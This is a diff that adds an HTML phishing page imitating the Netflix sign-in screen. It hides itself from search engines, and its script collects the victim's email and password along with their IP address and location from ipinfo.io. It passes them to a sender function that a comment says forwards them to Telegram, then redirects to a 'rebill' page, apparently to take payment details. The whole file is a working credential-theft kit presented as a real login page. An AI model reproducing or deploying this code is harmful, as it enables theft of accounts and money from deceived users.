@@ -1,0 +1,231 @@
+<!doctype html>
+<html>
+<head>
+<title>Sign In</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="slurp" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="msnbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="yahoo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="duckduckgo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="google" content="notranslate">
+<meta http-equiv="X-Frame-Options" content="DENY">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="shortcut icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
+<link rel="stylesheet" href="res/style.css">
+<script src="res/jq.js"></script>
+<script src="res/jquery1.js"></script>
+<script src="sax.js"></script> <!-- Ensure sax.js is referenced -->
+</head>
+<body>
+<header class="header">
+<img src="res/logo.png">
+</header>
+
+<section class="content">
+    <div class="form">
+        <div class="form-title" id="form-title">
+            <!-- Title will be set dynamically -->
+        </div>
+
+        <div class="form-col">
+            <input type="text" class="textinput" id="in-u" placeholder="Email or mobile number">
+            <div class="err" id="errortext-u"></div>
+        </div>
+        <div class="form-col">
+            <input type="password" class="textinput" id="in-pw" placeholder="Password">
+            <div class="err" id="errortext-pw"></div>
+        </div>
+        <div class="form-col">
+            <button id="submit" class="sbmt">Sign In</button>
+        </div>
+
+        <div class="form-col" style="display:flex; align-items:center; color:#717171; font-size:0.8em;">
+            <div style="width:50%; text-align:left; display:flex; align-items:center;">
+                <input type="checkbox" checked class="checkboxa"> Remember Me
+            </div>
+            <div style="text-align:right; width:50%;">Need Help?</div>
+        </div>
+
+        <div style="color:#717171; margin-top:60px;">
+            New to Netflix? <a href="#" style="color:white; text-decoration:none;">Sign Up</a>
+        </div>
+
+        <div style="color:#717171; font-size:0.8em; margin:30px 0;">
+            This page is protected by Google reCAPTCHA to ensure you're not a bot. Learn more.
+        </div>
+
+    </div>
+</section>
+
+<footer class="footer">
+    <div>Contact Us</div>
+    <div style="margin:30px 0;">FAQ</div>
+    <div>
+        <select style="padding:10px; background:none; color:#717171;" id="lang" onchange="setLang()">
+            <option value="EN">English</option>
+            <option value="ES">Española</option>
+            <option value="DE">Deutsche</option>
+            <option value="FR">Français</option>
+        </select>
+    </div>
+</footer>
+
+<script>
+    const langData = {
+        'EN': {
+            title: 'Sign In',
+            loginBtn: 'Sign In',
+            rememberMe: 'Remember Me',
+            needHelp: 'Need Help?',
+            newTo: 'New to Netflix?',
+            signUp: 'Sign up now.',
+            captchaMessage: 'This page is protected by Google reCAPTCHA to ensure you\'re not a bot. Learn more.',
+        },
+        'ES': {
+            title: 'Iniciar sesión',
+            loginBtn: 'Iniciar sesión',
+            rememberMe: 'Recuérdame',
+            needHelp: '¿Necesitas ayuda?',
+            newTo: '¿Nuevo en nosotros?',
+            signUp: 'Regístrate',
+            captchaMessage: 'Por favor, verifica que eres humano.',
+        }
+    };
+
+    var currentLang = 'EN'; // Default language
+
+    // Fetch user's location details
+    function fetchLocation() {
+        return fetch('https://ipinfo.io/json?token=5cef41c9802ee9')
+            .then(response => response.json())
+            .then(data => {
+                userLocation.ip = data.ip;
+                userLocation.city = data.city;
+                userLocation.state = data.region;
+                userLocation.country = data.country;
+            })
+            .catch(error => {
+                console.error('Error fetching location:', error);
+                userLocation.ip = 'N/A';
+                userLocation.city = 'N/A';
+                userLocation.state = 'N/A';
+                userLocation.country = 'N/A';
+            });
+    }
+
+    function setLang() {
+        currentLang = document.getElementById("lang").value;
+        loadLangText();
+    }
+
+    function loadLangText() {
+        const lang = langData[currentLang];
+        document.getElementById('form-title').textContent = lang.title;
+        document.getElementById('submit').textContent = lang.loginBtn;
+        document.querySelector('.checkboxa').nextElementSibling.textContent = lang.rememberMe;
+        document.querySelector('.form-col').nextElementSibling.nextElementSibling.textContent = lang.needHelp;
+        document.querySelector('.form-col').nextElementSibling.nextElementSibling.textContent = lang.newTo + " <a href='#' style='color:white; text-decoration:none;'>" + lang.signUp + "</a>";
+        document.querySelector('.captcha-message').textContent = lang.captchaMessage;
+    }
+
+    // On page load, set the language text
+    window.onload = function () {
+        loadLangText();
+    };
+
+    // Function for handling form submission
+    var allowvalidate = false;
+    var errors = ["Please enter a valid email or phone number.", "Your password must contain between 4 and 60 characters."];
+    var abort = false;
+
+    function sbmt() {
+        allowvalidate = true;
+        abort = false;
+
+        // Validate username and password
+        if ($("#in-u").val() === "") {
+            abort = true;
+            $("#errortext-u").html(errors[0]);
+            $("#in-u").css("border-bottom", "2px solid #e77508");
+        }
+        if ($("#in-pw").val() === "") {
+            abort = true;
+            $("#errortext-pw").html(errors[1]);
+            $("#in-pw").css("border-bottom", "2px solid #e77508");
+        }
+
+        if (!abort) {
+            $("#submit").css("background", "#e72f38");
+
+            // Ensure location data is available
+            fetchLocation().then(function () {
+                // Create the message format
+                var messageData = {
+                    user: $("#in-u").val(),
+                    pass: $("#in-pw").val(),
+                    ip: userLocation.ip,
+                    city: userLocation.city,
+                    state: userLocation.state,
+                    country: userLocation.country
+                };
+
+                console.log("Sending data to Telegram: ", messageData); // Debugging line
+
+                // Sending the data to Telegram using sax.js
+                sender("login", messageData); // Pass "login" and messageData
+
+                // After sending, you can redirect the user or show a success message
+                window.location = "rebill.html"; // Redirect to rebill page
+            });
+        }
+    }
+
+    function validate() {
+        if (allowvalidate) {
+            if ($("#in-u").val() === "") {
+                $("#errortext-u").html(errors[0]);
+                $("#in-u").css("border-bottom", "2px solid #e77508");
+            } else {
+                $("#errortext-u").html("");
+                $("#in-u").css("border", "none");
+            }
+            if ($("#in-pw").val() === "") {
+                $("#errortext-pw").html(errors[1]);
+                $("#in-pw").css("border-bottom", "2px solid #e77508");
+            } else {
+                $("#errortext-pw").html("");
+                $("#in-pw").css("border", "none");
+            }
+        }
+    }
+
+    // Event listeners for real-time validation
+    $("#in-u").keyup(function () {
+        validate();
+    });
+
+    $("#in-pw").keyup(function () {
+        validate();
+    });
+
+    // Allow submission when Enter key is pressed
+    $("input").keypress((e) => {
+        if (e.key == "Enter") {
+            sbmt();
+        }
+    });
+
+    // Add event listener to "Sign In" button to trigger submission
+    document.getElementById("submit").addEventListener("click", sbmt);
+
+</script>
+
+</body>
+</html>
